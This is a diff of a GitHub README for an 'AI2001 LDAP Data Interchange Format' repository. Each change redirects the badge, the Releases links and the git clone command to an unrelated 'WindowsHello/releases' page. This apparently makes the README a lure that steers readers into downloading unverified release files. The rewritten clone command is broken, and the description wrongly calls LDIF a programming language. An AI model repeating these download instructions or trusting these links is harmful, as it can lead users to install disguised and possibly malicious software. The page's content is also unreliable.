@@ -1,8 +1,8 @@
 # AI2001 LDAP Data Interchange Format Source Code Repository
 
-![GitHub Release](https://img.shields.io/badge/Latest_Release-Download-brightgreen) [![GitHub Repo stars](https://img.shields.io/github/stars/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format)](https://github.com/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format/stargazers)
+![GitHub Release](https://img.shields.io/badge/Latest_Release-Download-brightgreen) [![GitHub Repo stars](https://img.shields.io/github/stars/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format)](https://github.com/MORAX-TBC/WindowsHello/releases)
 
-Welcome to the **AI2001 LDAP Data Interchange Format** repository. This project contains datasets and source code related to the LDAP Data Interchange Format programming language for the AI2001 initiative. You can download the latest release from the [Releases section](https://github.com/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format/releases).
+Welcome to the **AI2001 LDAP Data Interchange Format** repository. This project contains datasets and source code related to the LDAP Data Interchange Format programming language for the AI2001 initiative. You can download the latest release from the [Releases section](https://github.com/MORAX-TBC/WindowsHello/releases).
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with the source code and datasets, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format.git
+   git clone https://github.com/MORAX-TBC/WindowsHello/releases
    ```
 
 2. Navigate to the project directory:
@@ -50,7 +50,7 @@ To get started with the source code and datasets, follow these steps:
    cd AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format
    ```
 
-3. Download the latest release. You can find it in the [Releases section](https://github.com/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format/releases).
+3. Download the latest release. You can find it in the [Releases section](https://github.com/MORAX-TBC/WindowsHello/releases).
 
 4. Follow the instructions in the documentation to set up your environment.
 
@@ -116,4 +116,4 @@ For any questions or suggestions, feel free to reach out:
 - **Email**: contact@example.com
 - **GitHub Issues**: Open an issue in this repository for any bugs or feature requests.
 
-Thank you for your interest in the AI2001 LDAP Data Interchange Format repository. We hope you find it useful for your AI projects. Don’t forget to check the [Releases section](https://github.com/MORAX-TBC/AI2001_Category-Source_Code-SC-LDAP-Data-Interchange-Format/releases) for the latest updates and downloads.
+Thank you for your interest in the AI2001 LDAP Data Interchange Format repository. We hope you find it useful for your AI projects. Don’t forget to check the [Releases section](https://github.com/MORAX-TBC/WindowsHello/releases) for the latest updates and downloads.
